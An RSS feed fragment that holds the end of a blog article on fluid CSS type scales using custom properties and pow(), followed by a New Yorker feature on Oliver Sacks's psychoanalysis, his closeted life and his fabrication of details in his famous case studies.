    &lt;p&gt; This opens a whole world of possibilities, as now we can easily switch between different type scales and sizes live from your console, which we find really handy for prototyping. Having all your spacing relative to just two measures makes it trivial to generate different additional type or space sizes when needed. In case I need a font size a half-step bigger or smaller than any of my current sizes, we just have to multiply or divide by the square root of my &lt;code&gt;--fluid-step&lt;/code&gt; variable. &lt;/p&gt;
    &lt;code&gt;       --fluid-base-size: calc(
  var(--base-font-size-small) +
  (
    var(--base-font-size-large) -
    var(--base-font-size-small)
  ) *
  var(--screen-normalizer)
);

--fluid-step: calc(
  var(--lower-ratio) +
  (
    var(--upper-ratio) -
    var(--lower-ratio)
  ) *
  var(--screen-normalizer)
);

--fluid-step-half: pow(var(--fluid-step), 0.5);

.font-size-sm {
  font-size: calc(var(--fluid-base-size) / var(--fluid-step-half));
}

.font-size-base {
  font-size: var(--fluid-base-size);
}

.font-size-demi {
  font-size: calc(var(--fluid-base-size) * var(--fluid-step-half));
}

.font-size-md {
  font-size: calc(var(--font-size-base) * var(--fluid-step))
}

.font-size-lg {
  font-size: calc(var(--font-size-md) * var(--fluid-step))
}
    &lt;/code&gt;
    &lt;p&gt;Font size xs&lt;/p&gt;
    &lt;p&gt;0px / 0.000 =&lt;/p&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size demi&lt;/p&gt;
    &lt;p&gt;0px * 0.000 =&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; As of today, this is still just supported in Chrome, but we can start using it having Utopia generated classes as fallback using &lt;code&gt;@supports&lt;/code&gt; rules. &lt;/p&gt;
    &lt;code&gt;       --step-0: clamp(0.875rem, 0.8333rem + 0.2222vw, 1rem);

.font-size-base {
  font-size: var(--step-0);
}

@supports (transform: scale(calc(1px / 1px))) {
  --fluid-base-size: calc(
    var(--base-font-size-small) +
    (
      var(--base-font-size-large) -
      var(--base-font-size-small)
    ) *
    var(--screen-normalizer)
  );

  .font-size-base {
    font-size: var(--fluid-base-size);
  }
}
    &lt;/code&gt;
    &lt;head rend="h2"&gt;The future: CSS functions&lt;/head&gt;
    &lt;p&gt; While already in the baseline support, CSS functions still don't support some mathematical functions as &lt;code&gt;pow()&lt;/code&gt; or &lt;code&gt;clamp()&lt;/code&gt;. When that time comes, it will be even easier to make font and space sizes on the fly, using just a function and a number that expresses the number of steps on your design system. For example, &lt;code&gt;--fluid-size(2)&lt;/code&gt; could be used to get the size for the second step in the scale and work both for fonts and for spacing. &lt;/p&gt;
    &lt;code&gt;       @function --fluid-scaler(--small-measure, --large-measure) {
  result: calc(
    --small-measure +
    (
      --large-measure -
      --small-measure
    ) *
    var(--screen-normalizer)
  );
}

--fluid-base-size: --fluid-scaler(
  var(--base-font-size-small),
  var(--base-font-size-large)
);

--fluid-step: --fluid-scaler(
  var(--lower-ratio),
  var(--upper-ratio)
);

@function --fluid-size(--step) {
  result: calc(
    var(--fluid-base-size) *
    var(--fluid-step) ^
    var(--step)
  );
}

.font-size-base {
  font-size: --fluid-size(1);
}

.font-size-md {
  font-size: --fluid-size(2);
}
    &lt;/code&gt;
    &lt;p&gt;Meanwhile, pressing the button below will open a menu that will let you play with all the typographic measures of this website, squizzing and expanding it as much as you like!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46317765</guid><pubDate>Thu, 18 Dec 2025 19:56:04 +0000</pubDate></item><item><title>Oliver Sacks put himself into his case studies – what was the cost?</title><link>https://www.newyorker.com/magazine/2025/12/15/oliver-sacks-put-himself-into-his-case-studies-what-was-the-cost</link><description>&lt;doc fingerprint="b6d197fda2b78777"&gt;
  &lt;main&gt;
    &lt;p&gt;When Oliver Sacks arrived in New York City, in September, 1965, he wore a butter-colored suit that reminded him of the sun. He had just spent a romantic week in Europe travelling with a man named Jenö Vincze, and he found himself walking too fast, fizzing with happiness. “My blood is champagne,” he wrote. He kept a letter Vincze had written him in his pocket all day, feeling as if its pages were glowing. Sacks had moved to New York to work as a fellow in neuropathology at the Albert Einstein College of Medicine, in the Bronx, and a colleague observed that he was “walking on air.” Every morning, he carefully polished his shoes and shaved. He adored his bosses. “I smile like a lighthouse in all directions,” he wrote Vincze.&lt;/p&gt;
    &lt;p&gt;Sacks was thirty-two, and he told Vincze that this was his first romantic relationship that was both physical and reciprocal. He felt he was part of a “two man universe,” seeing the world for the first time—“seeing it clear, and seeing it whole.” He wandered along the shipping piers on the Hudson River, where gay men cruised, with a notebook that he treated as a diary and as an endless letter to Vincze. “To watch life with the eyes of a homosexual is the greatest thing in the world,” Vincze had once told Sacks.&lt;/p&gt;
    &lt;p&gt;Sacks’s mother, a surgeon in London, had suspected that her son was gay when he was a teen-ager. She declared that homosexuality was an “abomination,” using the phrase “filth of the bowel” and telling him that she wished he’d never been born. They didn’t speak of the subject again. Sacks had moved to America—first to California and then, after five years, to New York—because, he wrote in his journal, “I wanted a sexual and moral freedom I felt I could never have in England.” That fall, during Yom Kippur, he decided that, rather than going to synagogue to confess “to the total range of human sin,” a ritual he’d grown up with, he’d spend the night at a bar, enjoying a couple of beers. “What I suppose I am saying, Jenö, is that I now feel differently about myself, and therefore about homosexuality as a whole,” he wrote. “I am through with cringing, and apologies, and pious wishes that I might have been ‘normal.’ ” (The Oliver Sacks Foundation shared with me his correspondence and other records, as well as four decades’ worth of journals—many of which had not been read since he wrote them.)&lt;/p&gt;
    &lt;p&gt;In early October, Sacks sent two letters to Vincze, but a week passed without a reply. Sacks asked his colleagues to search their mailboxes, in case the letter had been put in the wrong slot. Within a few days, however, he had given up on innocent explanations. He began dressing sloppily. He stopped coming to work on time. He had sex with a series of men who disgusted him.&lt;/p&gt;
    &lt;p&gt;After two weeks, Vincze, who was living in Berlin, sent a letter apologizing for his delayed reply and reiterating his love. He explained that he was so preoccupied by thoughts of Sacks that he felt as if he were living in a “Klaudur,” a German word that Vincze defined as a “spiritual cell.” He seems to have misspelled Klausur, which refers to an enclosed area in a monastery, but Sacks kept using the misspelled word, becoming obsessed with it. “It ramifies in horrible associations,” he wrote Vincze. “The closing of a door. Klaudur, claustrophobia, the sense of being shut in.” Sacks had long felt as if he were living in a cell, incapable of human contact, and this word appeared to be all he needed to confirm that the condition was terminal. The meaning of the word began morphing from “spiritual cell” to “psychotic cage.”&lt;/p&gt;
    &lt;p&gt;The intimacy Sacks had rejoiced in now seemed phony, a “folie à deux”—a two-person delusion. His doubts intensified for a month, then he cut off the relationship. “I must tear you out of my system, because I dare not be involved,” he told Vincze, explaining that he barely remembered how he looked, or the sound of his voice. “I hope I will not be taken in like this again, and that—conversely—I will have the strength and clarity of mind to perceive any future such relationships as morbid at their inception, and to abort the folly of their further growth.”&lt;/p&gt;
    &lt;p&gt;Two months later, Sacks felt himself “slipping down the greased path of withdrawal, discontent, inability to make friends, inability to have sex, etc. etc. towards suicide in a New York apartment at the age of 32.” He took enormous amounts of amphetamines, to the point of hallucinating. A family friend, a psychiatrist who worked with Anna Freud, urged him to find a psychoanalyst. She wrote him that his homosexuality was “a very ‘secondary phenomenon’ ”: he was attracted to men as “a substitute for veering uncertainties of what/whom you could love other than as ‘idealizations’ of yourself.” A few weeks later, he started therapy with Leonard Shengold, a young psychiatrist who was deeply immersed in Manhattan’s psychoanalytic culture. “I think he is very good, and he has at least a very considerable local reputation,” Sacks wrote his parents, who helped to pay for the sessions, three times a week.&lt;/p&gt;
    &lt;p&gt;Sacks had elevated yet hazy ambitions at the time: he wanted to be a novelist, but he also wanted to become the “Galileo of the inward,” he told a mentor, and to write the neurological equivalent of Sigmund Freud’s “Interpretation of Dreams.” He worked in wards with chronically ill and elderly patients who had been warehoused and neglected, and his prospects within academic medicine looked dim. “Have you published anything lately?” his father wrote him, in 1968. “Or have you found yourself temperamentally incapacitated from doing so?”&lt;/p&gt;
    &lt;p&gt;When Sacks began therapy, “my initial and ultimate complaint was of fixity—a feeling of not-going,” he wrote in his journal. He regarded Shengold as “a sort of analytic machine.” But gradually Sacks came to feel that “I love him, and need him; that I need him—and love him.” He had planned to stay in New York City only for a few years, but he kept delaying his return to England so that he could reach “a terminable point in my analysis.” Shengold, who would eventually publish ten books about psychoanalysis, wrote that therapy requires a “long period of working through”—a term he defined as the “need to repeat emotional conflicts over and over in life” until the patient has the “freedom to own what is there to be felt.”&lt;/p&gt;
    &lt;p&gt;Sacks saw Shengold for half a century. In that time, Sacks became one of the world’s most prominent neurologists and a kind of founding father of medical humanities—a discipline that coalesced in the seventies, linking healing with storytelling. But the freedom that Shengold’s analysis promised was elusive. After Vincze, Sacks did not have another relationship for forty-four years. He seemed to be doing the “working through” at a remove—again and again, his psychic conflicts were displaced onto the lives of his patients. He gave them “some of my own powers, and some of my phantasies too,” he wrote in his journal. “I write out symbolic versions of myself.”&lt;/p&gt;
    &lt;p&gt;During Sacks’s neurology internship, in San Francisco, his childhood friend Eric Korn warned him that the residents at his hospital could sense he was gay. “For God’s sake, exercise what seems to you immoderate caution,” Korn wrote, in 1961. “Compartmentalize your life. Cover your tracks. Don’t bring in the wrong sort of guests to the hospital, or sign your name and address to the wrong sort of register.” He encouraged Sacks to read “Homosexuality: Disease or Way of Life?,” a best-selling book by Edmund Bergler, who argued that homosexuality was an “illness as painful, as unpleasant and as disabling as any other serious affliction,” but one that psychoanalysis could cure. “The book is full of interest,” Korn wrote. “He claims a potential 100% ‘cures’ (a term he chooses to employ because he knows it teases) which is worth investigating perhaps.”&lt;/p&gt;
    &lt;p&gt;Freud characterized homosexuality as a relatively normal variant of human behavior, but when psychoanalysis came to the United States, in the postwar years, homophobia took on new life. The historian Dagmar Herzog has described how, in the U.S., “reinventing psychoanalysis and reinventing homophobia went hand in hand.” Faced with men who persisted in their love for other men, American analysts commonly proposed celibacy as a stopgap solution. In the historian Martin Duberman’s memoir “Cures,” he writes that his psychoanalyst instructed him to “take the veil”—live celibately—so that he could be cured of his desire for men. Duberman agreed to these terms. The best he could get, he thought, was sublimation: instead of enjoying an “affective life,” he would make “some contribution to the general culture from which I was effectively barred.” Sacks, who was closeted until he was eighty, also followed this course.&lt;/p&gt;
    &lt;p&gt;Shengold had portraits of Charles Dickens, William Shakespeare, and Sigmund Freud in his office, on the Upper East Side. Like Sacks, he came from a literary Jewish family. He seemed deeply attuned to Sacks’s creative life, which took the form of ecstatic surges of literary inspiration followed by months of sterility and depression. “Do your best to enjoy and to work—it is the power of your mind that is crucial,” Shengold wrote when Sacks was on a visit with his family in England. Sacks wrote in his journal that he’d dreamed he overheard Shengold telling someone, “Oliver is lacking in proper self-respect; he has never really appreciated himself, or appreciated others’ appreciation of him. And yet, in his way, he is not less gifted than Auden was.” Sacks woke up flushed with embarrassment and pleasure.&lt;/p&gt;
    &lt;p&gt;Unlike many of his contemporaries, Shengold was not a doctrinaire thinker, but he was still susceptible to psychoanalytic fashions. Reflecting on how he might have viewed living openly as a gay man at that time, Shengold’s daughter, Nina, told me, “I don’t know that was a door that Dad necessarily had wide open.” In several books and papers, Shengold, a prolific reader of Western literature, tried to understand the process by which troubled people sublimate their conflicts into art. In his 1988 book, “Halo in the Sky: Observations on Anality and Defense,” Shengold wrote about the importance of transforming “anal-sadistic drives”—he used the anus as a metaphor for primitive, dangerous impulses—into “adaptive and creative ‘making.’ ” When Sacks read the book, he wrote in his journal that it “made me feel I was ‘lost in anality’ (whatever this means).”&lt;/p&gt;
    &lt;p&gt;Before Vincze, Sacks had been in love with a man named Mel Erpelding, who once told him, Sacks wrote, that he “oozed sexuality, that it poured out through every pore, that I was alive and vibrant with sexuality (a positive-admiring way of putting things), but also that I was reeking and toxic with it.” (Erpelding, who ended up marrying a woman, never allowed his relationship with Sacks to become sexual.) In his early years of therapy, in the late sixties, Sacks resolved that he would give up both drugs and sex. It’s doubtful that Shengold encouraged his celibacy, but he may have accepted that sexual abstinence could be productive, at least for a time. Richard Isay, the first openly gay member of the American Psychoanalytic Association, said that, in the seventies, he’d “rationalized that maturity and mental health demanded the sublimation of sexual excitement in work.” Sacks told a friend, “Shengold is fond of quoting Flaubert’s words ‘the mind has its erections too.’ ”&lt;/p&gt;
    &lt;p&gt;For Sacks, writing seemed almost physiological, like sweating—an involuntary response to stimuli. He routinely filled a whole journal in two days. “Should I then put down my pen, my interminable Journal (for this is but a fragment of the journal I have kept all my life),” he asked, “and ‘start living’ instead?” The answer was almost always no. Sometimes Sacks, who would eventually publish sixteen books, wrote continuously in his journal for six hours. Even when he was driving his car, he was still writing—he set up a tape recorder so that he could keep developing his thoughts, which were regularly interrupted by traffic or a wrong turn. Driving through Manhattan one day in 1975, he reflected on the fact that his closets, stuffed with pages of writing, resembled a “grave bursting open.”&lt;/p&gt;
    &lt;p&gt;By the late sixties, Sacks had become, he wrote, “almost a monk in my asceticism and devotion to work.” He estimated that he produced a million and a half words a year. When he woke up in the middle of the night with an erection, he would cool his penis by putting it in orange jello. He told Erpelding, “I partly accept myself as a celibate and a cripple, but partly—and this is . . . the wonder of sublimation—am able to transform my erotic feelings into other sorts of love—love for my patients, my work, art, thought.” He explained, “I keep my distance from people, am always courteous, never close. For me (as perhaps for you) there is almost no room, no moral room.”&lt;/p&gt;
    &lt;p&gt;“I have some hard ‘confessing’ to do—if not in public, at least to Shengold—and myself,” Sacks wrote in his journal, in 1985. By then, he had published four books—“Migraine,” “Awakenings,” “A Leg to Stand On,” and “The Man Who Mistook His Wife for a Hat”—establishing his reputation as “our modern master of the case study,” as the Times put it. He rejected what he called “pallid, abstract knowing,” and pushed medicine to engage more deeply with patients’ interiority and how it interacted with their diseases. Medical schools began creating programs in medical humanities and “narrative medicine,” and a new belief took hold: that an ill person has lost narrative coherence, and that doctors, if they attend to their patients’ private struggles, could help them reconstruct a new story of their lives. At Harvard Medical School, for a time, students were assigned to write a “book” about a patient. Stories of illness written by physicians (and by patients) began proliferating, to the point that the medical sociologist Arthur Frank noted, “ ‘Oliver Sacks’ now designates not only a specific physician author but also a . . . genre—a distinctively recognizable form of storytelling.”&lt;/p&gt;
    &lt;p&gt;But, in his journal, Sacks wrote that “a sense of hideous criminality remains (psychologically) attached” to his work: he had given his patients “powers (starting with powers of speech) which they do not have.” Some details, he recognized, were “pure fabrications.” He tried to reassure himself that the exaggerations did not come from a shallow place, such as a desire for fame or attention. “The impulse is both ‘purer’—and deeper,” he wrote. “It is not merely or wholly a projection—nor (as I have sometimes, ingeniously-disingenuously, maintained) a mere ‘sensitization’ of what I know so well in myself. But (if you will) a sort of autobiography.” He called it “symbolic ‘exo-graphy.’ ”&lt;/p&gt;
    &lt;p&gt;Sacks had “misstepped in this regard, many many times, in ‘Awakenings,’ ” he wrote in another journal entry, describing it as a “source of severe, long-lasting, self-recrimination.” In the book, published in 1973, he startled readers with the depth of his compassion for some eighty patients at Beth Abraham Hospital, in the Bronx, who had survived an epidemic of encephalitis lethargica, a mysterious, often fatal virus that appeared around the time of the First World War. The patients had been institutionalized for decades, in nearly catatonic states. At the time, the book was met with silence or skepticism by other neurologists—Sacks had presented his findings in a form that could not be readily replicated, or extrapolated from—but, to nonspecialists, it was a masterpiece of medical witnessing. The Guardian would name it the twelfth-best nonfiction book of all time.&lt;/p&gt;
    &lt;p&gt;Sacks spent up to fifteen hours a day with his patients, one of the largest groups of post-encephalitic survivors in the world. They were “mummified,” like “living statues,” he observed. A medicine called L-dopa, which elevates the brain’s dopamine levels, was just starting to be used for Parkinson’s disease, on an experimental basis, and Sacks reasoned that his patients, whose symptoms resembled those of Parkinson’s, could benefit from the drug. In 1969, within days of giving his patients the medication, they suddenly “woke up,” their old personalities intact. Other doctors had dismissed these patients as hopeless, but Sacks had sensed that they still had life in them—a recognition that he understood was possible because he, too, felt as if he were “buried alive.”&lt;/p&gt;
    &lt;p&gt;In “Awakenings,” Sacks writes about his encounters with a man he calls Leonard L. “What’s it like being the way you are?” Sacks asks him the first time they meet. “Caged,” Leonard replies, by pointing to letters of the alphabet on a board. “Deprived. Like Rilke’s ‘Panther’ ”—a reference to a poem by Rainer Maria Rilke about a panther pacing repetitively in cramped circles “around a center / in which a mighty will stands paralyzed.”&lt;/p&gt;
    &lt;p&gt;When Sacks was struggling to write his first book, “Migraine,” he told a friend that he felt like “Rilke’s image of the caged panther, stupefied, dying, behind bars.” In a letter to Shengold, he repeated this image. When Sacks met Leonard, he jotted down elegant observations in his chart (“Quick and darting eye movements are at odds with his general petrified immobility”), but there is no mention of Leonard invoking the Rilke poem.&lt;/p&gt;
    &lt;p&gt;In the preface to “Awakenings,” Sacks acknowledges that he changed circumstantial details to protect his patients’ privacy but preserved “what is important and essential—the real and full presence of the patients themselves.” Sacks characterizes Leonard as a solitary figure even before his illness: he was “continually buried in books, and had few or no friends, and indulged in none of the sexual, social, or other activities common to boys of his age.” But, in an autobiography that Leonard wrote after taking L-dopa, he never mentions reading or writing or being alone in those years. In fact, he notes that he spent all his time with his two best friends—“We were inseparable,” he writes. He also recalls raping several people. “We placed our cousin over a chair, pulled down her pants and inserted our penises into the crack,” he writes on the third page, in the tone of an aging man reminiscing on better days. By page 10, he is describing how, when he babysat two girls, he made one of them strip and then “leaped on her. I tossed her on her belly and pulled out my penis and placed it between her buttocks and started to screw her.”&lt;/p&gt;
    &lt;p&gt;In “Awakenings,” Sacks has cleansed his patient’s history of sexuality. He depicts him as a man of “most unusual intelligence, cultivation, and sophistication”—the “ ‘ideal’ patient.” L-dopa may have made Leonard remember his childhood in a heightened sexual register—his niece and nephew, who visited him at the hospital until his death, in 1981, told me that the drug had made him very sexual. But they said that he had been a normal child and adolescent, not a recluse who renounced human entanglement for a life of the mind.&lt;/p&gt;
    &lt;p&gt;Sacks finished writing “Awakenings” rapidly in the weeks after burying his mother, who’d died suddenly, at the age of seventy-seven. He felt “a great open torrent—and release,” he wrote in his journal. “It seems to be surely significant that ‘Awakenings’ finally came forth from me like a cry after the death of my own mother.” He referred to the writing of the book as his “Great Awakening,” the moment he “came out.” He doesn’t mention another event of significance: his patients had awakened during the summer of the Stonewall riots, the beginning of the gay-rights movement.&lt;/p&gt;
    &lt;p&gt;Shengold once told Sacks that he had “never met anyone less affected by gay liberation.” (Shengold supported his own son when he came out as gay, in the eighties.) Sacks agreed with the characterization. “I remain resolutely locked in my cell despite the dancing at the prison gates,” he said, in 1984.&lt;/p&gt;
    &lt;p&gt;In “Awakenings,” his patients are at first overjoyed by their freedom; then their new vitality becomes unbearable. As they continue taking L-dopa, many of them are consumed by insatiable desires. “L-DOPA is wanton, egotistical power,” Leonard says in the book. He injures his penis twice and tries to suffocate himself with a pillow. Another patient is so aroused and euphoric that she tells Sacks, “My blood is champagne”—the phrase Sacks used to describe himself when he was in love with Vincze. Sacks begins tapering his patients’ L-dopa, and taking some of them off of it completely. The book becomes a kind of drama about dosage: an examination of how much aliveness is tolerable, and at what cost. Some side effects of L-dopa, like involuntary movements and overactivity, have been well documented, but it’s hard not to wonder if “Awakenings” exaggerates the psychological fallout—Leonard becomes so unmanageable that the hospital moves him into a “punishment cell”—as if Sacks is reassuring himself that free rein of the libido cannot be sustained without grim consequence.&lt;/p&gt;
    &lt;p&gt;After “Awakenings,” Sacks intended his next book to be about his work with young people in a psychiatric ward at Bronx State Hospital who had been institutionalized since they were children. The environment reminded Sacks of a boarding school where he had been sent, between the ages of six and nine, during the Second World War. He was one of four hundred thousand children evacuated from London without their parents, and he felt abandoned. He was beaten by the headmaster and bullied by the other boys. The ward at Bronx State “exerted a sort of spell on me,” Sacks wrote in his journal, in 1974. “I lost my footing of proper sympathy and got sucked, so to speak, into an improper ‘perilous condition’ of identification to the patients.”&lt;/p&gt;
    &lt;p&gt;Shengold wrote several papers and books about a concept he called “soul murder”—a category of childhood trauma that induces “a hypnotic living-deadness, a state of existing ‘as if’ one were there.” Sacks planned to turn his work at Bronx State into a book about “ ‘SOUL MURDER’ and ‘SOUL SURVIVAL,’ ” he wrote. He was especially invested in two young men on the ward whom he thought he was curing. “The miracle-of-recovery started to occur in and through their relation to me (our relation and feelings to each other, of course),” he wrote in his journal. “We had to meet in a passionate subjectivity, a sort of collaboration or communication which transcended the Socratic relation of teacher-and-pupil.”&lt;/p&gt;
    &lt;p&gt;In a spontaneous creative burst lasting three weeks, Sacks wrote twenty-four essays about his work at Bronx State which he believed had the “beauty, the intensity, of Revelation . . . as if I was coming to know, once again, what I knew as a child, that sense of Dearness and Trust I had lost for so long.” But in the ward he sensed a “dreadful silent tension.” His colleagues didn’t understand the attention he was lavishing on his patients—he got a piano and a Ping-Pong table for them and took one patient to the botanical garden. Their suspicion, he wrote in his journal, “centred on the unbearability of my uncategorizability.” As a middle-aged man living alone—he had a huge beard and dressed eccentrically, sometimes wearing a black leather shirt—Sacks was particularly vulnerable to baseless innuendo. In April, 1974, he was fired. There had been rumors that he was molesting some of the boys.&lt;/p&gt;
    &lt;p&gt;That night, Sacks tore up his essays and then burned them. “Spite! Hate! Hateful spite!” he wrote in his journal shortly after. “And now I am empty—empty handed, empty hearted, desolate.”&lt;/p&gt;
    &lt;p&gt;The series of events was so distressing that even writing about it in his journal made Sacks feel that he was about to die. He knew that he should shrug off the false accusations as “vile idle gossip thrown by tiddlers and piddlers,” he wrote. But he couldn’t, because of “the parental accusation which I have borne—a Kafka-esque cross, guilt without crime, since my earliest days.”&lt;/p&gt;
    &lt;p&gt;The historian of medicine Henri Ellenberger observed that psychiatry owes its development to two intertwined dynamics: the neuroses of its founders—in trying to master their own conflicts, they came to new insights and forms of therapy—and the prolonged, ambiguous relationships they had with their patients. The case studies of these relationships, Ellenberger wrote, tended to have a distinct arc: psychiatrists had to unravel their patients’ “pathogenic secret,” a hidden source of hopelessness, in order to heal them.&lt;/p&gt;
    &lt;p&gt;Sacks’s early case studies also tended to revolve around secrets, but wonderful ones. Through his care, his patients realized that they had hidden gifts—for music, painting, writing—that could restore to them a sense of wholeness. The critic Anatole Broyard, recounting his cancer treatment in the Times Magazine in 1990, wrote that he longed for a charismatic, passionate physician, skilled in “empathetic witnessing.” In short, he wrote, a doctor who “would resemble Oliver Sacks.” He added, “He would see the genius of my illness.”&lt;/p&gt;
    &lt;p&gt;It speaks to the power of the fantasy of the magical healer that readers and publishers accepted Sacks’s stories as literal truth. In a letter to one of his three brothers, Marcus, Sacks enclosed a copy of “The Man Who Mistook His Wife for a Hat,” which was published in 1985, calling it a book of “fairy tales.” He explained that “these odd Narratives—half-report, half-imagined, half-science, half-fable, but with a fidelity of their own—are what I do, basically, to keep MY demons of boredom and loneliness and despair away.” He added that Marcus would likely call them “confabulations”—a phenomenon Sacks explores in a chapter about a patient who could retain memories for only a few seconds and must “make meaning, in a desperate way, continually inventing, throwing bridges of meaning over abysses,” but the “bridges, the patches, for all their brilliance . . . cannot do service for reality.”&lt;/p&gt;
    &lt;p&gt;Sacks was startled by the success of the book, which he had dedicated to Shengold, “my own mentor and physician.” It became an international best-seller, routinely assigned in medical schools. Sacks wrote in his journal,&lt;/p&gt;
    &lt;p&gt;He pondered the phrase “art is the lie that tells the truth,” often attributed to Picasso, but he seemed unconvinced. “I think I have to thrash this out with Shengold—it is killing me, soul-killing me,” he wrote. “My ‘cast of characters’ (for this is what they become) take on an almost Dickensian quality.”&lt;/p&gt;
    &lt;p&gt;Sacks once told a reporter that he hoped to be remembered as someone who “bore witness”—a term often used within medicine to describe the act of accompanying patients in their most vulnerable moments, rather than turning away. To bear witness is to recognize and respond to suffering that would otherwise go unseen. But perhaps bearing witness is incompatible with writing a story about it. In his journal, after a session with a patient with Tourette’s syndrome, Sacks describes the miracle of being “enabled to ‘feel’—that is, to imagine, with all the powers of my head and heart—how it felt to be another human being.” Empathy tends to be held up as a moral end point, as if it exists as its own little island of good work. And yet it is part of a longer transaction, and it is, fundamentally, a projection. A writer who imagines what it’s like to exist as another person must then translate that into his own idiom—a process that Sacks makes particularly literal.&lt;/p&gt;
    &lt;p&gt;“I’ll tell you what you are saying,” Sacks told a woman with an I.Q. of around 60 whose grandmother had just died. “You want to go down below and join your dead grandparents down in the Kingdom of Death.” In the conversation, which Sacks recorded, the patient becomes more expressive under the rare glow of her doctor’s sustained attention, and it’s clear that she is fond of him. But he is so excited about her words (“One feels that she is voicing universal symbols,” he says in a recording, “symbols which are infinite in meaning”) that he usurps her experience.&lt;/p&gt;
    &lt;p&gt;“I know, in a way, you don’t feel like living,” Sacks tells her, in another recorded session. “Part of one feels dead inside, I know, I know that. . . . One feels that one wants to die, one wants to end it, and what’s the use of going on?”&lt;/p&gt;
    &lt;p&gt;“I don’t mean it in that way,” she responds.&lt;/p&gt;
    &lt;p&gt;“I know, but you do, partly,” Sacks tells her. “I know you have been lonely all your life.”&lt;/p&gt;
    &lt;p&gt;The woman’s story is told, with details altered, in a chapter in “Hat” titled “Rebecca.” In the essay, Rebecca is transformed by grief for her grandmother. She reminds Sacks of Chekhov’s Nina, in “The Seagull,” who longs to be an actress. Though Nina’s life is painful and disappointing, at the end of the play her suffering gives her depth and strength. Rebecca, too, ends the story in full flower. “Rather suddenly, after her grandmother’s death,” Sacks writes, she becomes decisive, joining a theatre group and appearing to him as “a complete person, poised, fluent,” a “natural poet.” The case study is presented as an ode to the power of understanding a patient’s life as a narrative, not as a collection of symptoms. But in the transcripts of their conversations—at least the ones saved from the year that followed, as well as Sacks’s journals from that period—Rebecca never joins a theatre group or emerges from her despair. She complains that it’s “better that I shouldn’t have been born,” that she is “useless,” “good for nothing,” and Sacks vehemently tries to convince her that she’s not. Instead of bearing witness to her reality, he reshapes it so that she, too, awakens.&lt;/p&gt;
    &lt;p&gt;Some of the most prominent nonfiction writers of Sacks’s era (Joseph Mitchell, A. J. Liebling, Ryszard Kapuściński) also took liberties with the truth, believing that they had a higher purpose: to illuminate the human condition. Sacks was writing in that spirit, too, but in a discipline that depends on reproducible findings. The “most flagrant example” of his distortions, Sacks wrote in his journal, was in one of the last chapters of “Hat,” titled “The Twins,” about twenty-six-year-old twins with autism who had been institutionalized since they were seven. They spend their days reciting numbers, which they “savored, shared” while “closeted in their numerical communion.” Sacks lingers near them, jotting down the numbers, and eventually realizes that they are all prime. As a child, Sacks used to spend hours alone, trying to come up with a formula for prime numbers, but, he wrote, “I never found any Law or Pattern for them—and this gave me an intense feeling of Terror, Pleasure, and—Mystery.” Delighted by the twins’ pastime, Sacks comes to the ward with a book of prime numbers which he’d loved as a child. After offering his own prime number, “they drew apart slightly, making room for me, a new number playmate, a third in their world.” Having apparently uncovered the impossible algorithm that Sacks had once wished for, the twins continue sharing primes until they’re exchanging ones with twenty digits. The scene reads like a kind of dream: he has discovered that human intimacy has a decipherable structure, and identified a hidden pattern that will allow him to finally join in.&lt;/p&gt;
    &lt;p&gt;Before Sacks met them, the twins had been extensively studied because of their capacity to determine the day of the week on which any date in the calendar fell. In the sixties, two papers in the American Journal of Psychiatry provided detailed accounts of the extent of their abilities. Neither paper mentioned a gift for prime numbers or math. When Sacks wrote Alexander Luria, a Russian neuropsychologist, about his work with the twins, in 1973, he also did not mention any special mathematical skills. In 2007, a psychologist with a background in learning theory published a short article in the Journal of Autism and Developmental Disorders, challenging Sacks’s assertion that these twins could spontaneously generate large prime numbers. Because this is not something that humans can reliably do, Sacks’s finding had been widely cited, and was theoretically “important for not only psychologists but also for all scientists and mathematicians,” the psychologist wrote. (The psychologist had contacted Sacks to ask for the title of his childhood book of prime numbers, because he couldn’t find a book of that description, but Sacks said that it had been lost.) Without pointing to new evidence, another scientist wrote in Sacks’s defense, describing his case study as “the most compelling account of savant numerosity skills” and arguing, “This is an example of science at the frontier, requiring daring to advance new interpretations of partial data.”&lt;/p&gt;
    &lt;p&gt;After the publication of “Hat,” when Sacks was fifty-two years old, he wrote his friend Robert Rodman, a psychoanalyst, that “Shengold suggested, with some hesitancy, some months ago, that I should consider going deeper with him.” He added, “He also observes that I don’t complain, say, of sexual deprivation—though this is absolute.” At first, Sacks was worried that Shengold was preparing to dismiss him from treatment: “I’ve done all I can for you—now manage on your own!” Then he felt hopeful that he didn’t need to assume that “boredom-depression-loneliness-cutoffness” would define the rest of his life. He was also moved that, after twenty years, Shengold still considered him “worth extra work.”&lt;/p&gt;
    &lt;p&gt;But Sacks was shaken by the idea that they’d only been skimming the surface. He looked back through his notebooks and noticed “a perceptible decline in concern and passion,” which he felt had also dulled the quality of his thought. “Is the superficiality of my work, then, due to superficiality of relationships—to running away from whatever has deeper feeling and meaning?” he asked Rodman. “Is this perhaps spoken of, in a camouflaged way, when I describe the ‘superficialization’ of various patients?” As an example, he referenced an essay in “Hat” about a woman with a cerebral tumor. She was intelligent and amusing but seemed not to care about anyone. “Was this the ‘cover’ of some unbearable emotion?” he writes in the essay.&lt;/p&gt;
    &lt;p&gt;Sacks felt that Shengold was the reason he was still alive, and that he should go further with him. “What have I to lose?” he asked Rodman. But, he wrote, “what one has to lose, of course, may be just that quasi-stable if fragile ‘functioning’ . . . so there is reason to hesitate.” Going deeper would also mean more fully submitting to someone else’s interpretation, experiencing what he asked of his own patients; Rodman proposed that Sacks was “afraid of the enclosure of analysis, of being reduced and fixed with a formulated phrase.”&lt;/p&gt;
